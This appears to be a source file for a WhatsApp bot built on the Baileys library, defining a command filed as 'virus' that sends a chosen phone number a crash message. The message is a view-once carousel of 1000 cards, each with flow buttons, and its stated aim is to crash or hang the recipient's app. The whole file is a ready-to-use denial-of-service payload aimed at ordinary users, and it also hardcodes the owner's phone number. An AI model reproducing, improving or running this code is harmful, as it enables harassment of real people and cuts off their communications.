// Zaroori cheezein import ki ja rahi hain
const { cmd } = require('../command');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

// Helper function: Number ko saaf format (+92...) mein laane ke liye
const formatPhoneNumber = (number) => {
    if (!number) return null;
    let formatted = number.replace(/[^+\d]/g, '');
    if (formatted.match(/^\d/)) {
        formatted = '+' + formatted;
    }
    if (!formatted.match(/^\+\d{10,15}$/)) {
        return null;
    }
    return formatted;
};

// Command ki buniyadi maloomat aur logic
cmd({
    pattern: "bug-siomaan",
    alias: ["crash1", "hang1", "bug1"], // Updated with old aliases
    desc: "Sends a heavy carousel message to crash a user's WhatsApp.",
    category: "virus",
    react: "💀",
    filename: __filename
},
async (conn, mek, m, { from, args, q, reply }) => {
    try {
        const ownerJid = "923151105391@s.whatsapp.net";
        if (m.sender !== ownerJid) {
            return reply('🚫 *Owner Only Command!*\nYeh command sirf bot ka maalik istemal kar sakta hai.');
        }

        if (!q) {
            return reply("⚠️ *Target Missing!*\nPlease provide a target phone number.\n*Example:* .bug-siomaan +923001234567");
        }

        const targetNumber = formatPhoneNumber(q);
        if (!targetNumber) {
            return reply("❌ *Invalid Number Format.*\nUse international format like +923001234567");
        }

        const [onWhatsAppCheck] = await conn.onWhatsApp(targetNumber);
        if (!onWhatsAppCheck || !onWhatsAppCheck.exists) {
            return reply(`🤔 The number *${targetNumber}* does not seem to be on WhatsApp.`);
        }

        const targetJid = onWhatsAppCheck.jid;
        reply(`⏳ *Preparing Payload...*\nTarget: ${targetNumber}\nPlease wait.`);

        // Buttons
        let buttons = [];
        for (let i = 0; i < 5; i++) {
            buttons.push({
                'name': 'galaxy_message',
                'buttonParamsJson': JSON.stringify({
                    'header': 'null',
                    'body': 'xxx',
                    'flow_action': 'navigate',
                    'flow_action_payload': { 'screen': 'FORM_SCREEN' },
                    'flow_cta': 'Grattler',
                    'flow_id': '1169834181134583',
                    'flow_message_version': '3',
                    'flow_token': 'AQAAAAACS5FpgQ_cAAAAAE0QI3s'
                })
            });
        }

        // Cards
        let carouselCards = [];
        for (let i = 0; i < 1000; i++) {
            carouselCards.push({
                'body': { 'text': '🍀 𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 ☠️' },
                'footer': { 'text': '𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐛𝐲 𝐐𝐚𝐝𝐞𝐞𝐫_𝐊𝐡𝐚𝐧' },
                'header': {
                    'title': '☠️',
                    'hasMediaAttachment': true,
                    'imageMessage': {}
                },
                'nativeFlowMessage': { 'buttons': buttons }
            });
        }

        const finalMessage = generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: {
                        body: { text: '\u0000' },
                        footer: { text: '𝐒𝐀𝐊𝐎𝐍𝐀-𝐌𝐃 𝐛𝐲 𝐐𝐚𝐝𝐞𝐞𝐫_𝐊𝐡𝐚𝐧' },
                        header: { hasMediaAttachment: false },
                        carouselMessage: { cards: carouselCards }
                    }
                }
            }
        }, {});

        const sendResult = await conn.relayMessage(targetJid, finalMessage.message, {
            messageId: finalMessage.key.id
        });

        if (!sendResult) {
            return reply("❌ *Failed to deliver payload.* Message was blocked or dropped.");
        }

        reply(`✅ *Success!* Crash message sent to *${targetNumber}*.`);

    } catch (e) {
        console.error("Error in Bug command:", e);
        reply(`❌ An error occurred: ${e.message}`);
    }
});